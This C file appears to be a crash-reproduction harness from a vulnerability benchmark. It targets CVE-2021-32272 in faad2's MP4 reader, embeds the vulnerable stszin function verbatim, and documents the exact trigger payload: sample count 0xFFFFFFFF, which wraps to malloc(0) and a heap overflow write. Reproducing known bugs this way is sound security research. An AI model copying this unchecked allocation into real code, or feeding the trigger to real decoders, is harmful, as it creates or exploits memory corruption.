/*
 * Direct-call crash harness for dataset/cve_1d8a3f57 (CVE-2021-32272, faad2,
 * frontend/mp4read.c, function stszin).
 *
 * Root cause (verified live, matches baseline dedup_token
 * "stszin--parse--parse" and baseline.summary "mp4read.c:355:29 in stszin",
 * access=WRITE, cwe=CWE-787):
 *
 *   mp4config.frame.ents = u32in();                       // attacker u32
 *   mp4config.frame.data = malloc(sizeof(*mp4config.frame.data)
 *                                 * (mp4config.frame.ents + 1));
 *   if (!mp4config.frame.data) return ERR_FAIL;
 *   ofs = 0;
 *   mp4config.frame.data[0] = ofs;                         // <-- OOB write
 *
 * `mp4config.frame.ents` is uint32_t. `mp4config.frame.ents + 1` is computed
 * in 32-bit unsigned arithmetic (uint32_t + int promotes to uint32_t), so it
 * wraps to 0 iff ents == 0xFFFFFFFF -- the ONLY value of `ents` for which the
 * multiplication (then widened to size_t for the actual malloc() call)
 * collapses to malloc(0). ASan's malloc(0) still returns a valid non-NULL
 * pointer with zero usable bytes, so the very next statement --
 * `mp4config.frame.data[0] = ofs;` -- is an immediate 4-byte heap-buffer-
 * overflow WRITE, entirely inside stszin(), before the for-loop is ever
 * entered. This is exactly the well-known "stsz sample count == 0xFFFFFFFF"
 * integer-overflow bug (CVE-2021-32272).
 *
 * Real caller chain (mp4read.c): mp4read_open() opens the file into the
 * static FILE *g_fin, then the atom walker dispatches ATOM_DATA handlers
 * (stszin is the handler for the "stsz" atom) which read the atom's PAYLOAD
 * via u32in()/datain() -- fread() straight off g_fin, no size/tag re-read
 * inside stszin() itself (the outer walker already consumed those). So for
 * a direct call, the byte stream stszin() sees must START at the atom's
 * PAYLOAD (its first 3 u32in() calls are: version/flags, sample_size,
 * entries).
 *
 * The bundle's frozen io/input/0 is a full 364-byte MP4 container; the
 * relevant "stsz" atom therein (found at offset 328, verified via a direct
 * byte search) has payload bytes `00 00 00 00 | 00 00 00 00 | FF FF FF FF`
 * -- i.e. version/flags=0, sample_size=0, entries=0xFFFFFFFF, precisely the
 * CVE-2021-32272 trigger. This harness's io/input/0 is that exact 12-byte
 * payload (plus a few real trailing bytes copied from the same original
 * file, the start of the following "stco" atom) repositioned to the
 * direct-call entry point -- same attacker payload, just fed at the offset
 * stszin() actually reads from when called in isolation (the full container
 * walk -- ftyp/moov/trak/.../stbl -- is outside stszin()'s own call graph
 * and is not part of the vulnerable function).
 *
 * main() reads argv[1] into a HEAP buffer (malloc), then backs the real
 * static FILE *g_fin with an fmemopen() stream over that heap buffer (NOT a
 * bare fopen() of the path) so the attacker bytes u32in()/datain() fread()
 * from live on the heap, matching the "heap buffer, never stack/global"
 * requirement while keeping stszin()/u32in()/datain()/bswap32() byte-for-
 * byte verbatim (they are unmodified real callees, needed only to feed the
 * target function's fread()s -- the fault itself is inside stszin() only).
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

/* ---- verbatim from frontend/mp4read.h (mp4config_t) ---- */
typedef struct
{
    uint32_t ctime, mtime;
    uint32_t samplerate;
    // total sound samples
    uint32_t samples;
    uint32_t channels;
    // sample depth
    uint32_t bits;
    // buffer config
    uint16_t buffersize;
    uint32_t bitratemax;
    uint32_t bitrateavg;
    uint32_t framesamples;
    struct
    {
        uint32_t *data;
        uint32_t ents;
        int current;
        int maxsize;
    } frame;
    // AudioSpecificConfig data:
    struct
    {
        uint8_t buf[10];
        int size;
    } asc;
    uint32_t mdatofs;
    uint32_t mdatsize;
    struct {
        int size;
        uint8_t *data;
    } bitbuf;
    struct {
        int header;
        int tags;
    } verbose;
} mp4config_t;

/* ---- verbatim from frontend/mp4read.c (globals + real callees) ---- */

mp4config_t mp4config = { 0 };

static FILE *g_fin = NULL;

static inline uint32_t bswap32(const uint32_t u32)
{
#ifndef WORDS_BIGENDIAN
#if defined (__GNUC__) && ((__GNUC__ > 4) || ((__GNUC__ == 4) && (__GNUC_MINOR__ >= 3)))
    return __builtin_bswap32(u32);
#elif defined (_MSC_VER)
    return _byteswap_ulong(u32);
#else
    return (u32 << 24) | ((u32 << 8) & 0xFF0000) | ((u32 >> 8) & 0xFF00) | (u32 >> 24);
#endif
#else
    return u32;
#endif
}

enum {ERR_OK = 0, ERR_FAIL = -1, ERR_UNSUPPORTED = -2};

static int datain(void *data, int size)
{
    if (fread(data, 1, size, g_fin) != size)
        return ERR_FAIL;
    return size;
}

static uint32_t u32in(void)
{
    uint32_t u32;
    datain(&u32, 4);
    u32 = bswap32(u32);
    return u32;
}

/* ---- target function, embedded byte-for-byte from target/original_function.c ---- */

static int stszin(int size)
{
    int cnt;
    uint32_t ofs;

    // version/flags
    u32in();
    // Sample size
    u32in();
    // Number of entries
    mp4config.frame.ents = u32in();
    // fixme: check atom size
    mp4config.frame.data = malloc(sizeof(*mp4config.frame.data)
                                  * (mp4config.frame.ents + 1));

    if (!mp4config.frame.data)
        return ERR_FAIL;

    ofs = 0;
    mp4config.frame.data[0] = ofs;
    for (cnt = 0; cnt < mp4config.frame.ents; cnt++)
    {
        uint32_t fsize = u32in();

        ofs += fsize;
        if (mp4config.frame.maxsize < fsize)
            mp4config.frame.maxsize = fsize;

        mp4config.frame.data[cnt + 1] = ofs;

        if (ofs < mp4config.frame.data[cnt])
            return ERR_FAIL;
    }

    return size;
}

/* ---- direct-call driver ---- */

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <input>\n", argv[0]);
        return 64;
    }

    FILE *f = fopen(argv[1], "rb");
    if (!f) { perror("fopen"); return 64; }
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return 64; }
    long fsz = ftell(f);
    if (fsz < 0) { fclose(f); return 64; }
    if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return 64; }

    unsigned char *buf = (unsigned char *)malloc((size_t)fsz > 0 ? (size_t)fsz : 1);
    if (!buf) { fclose(f); return 64; }
    size_t n = fread(buf, 1, (size_t)fsz, f);
    fclose(f);

    /* Back the real static FILE *g_fin with a heap-buffer-fed stream, so
     * every u32in()/datain() fread() the target function performs reads
     * straight off the malloc'd attacker buffer (ASan heap redzones apply
     * exactly as if this were the real mp4read_open() file, just sourced
     * from memory instead of disk). */
    g_fin = fmemopen(buf, n, "rb");
    if (!g_fin) { free(buf); return 64; }

    stszin((int)n);

    fclose(g_fin);
    free(buf);
    return 0;
}
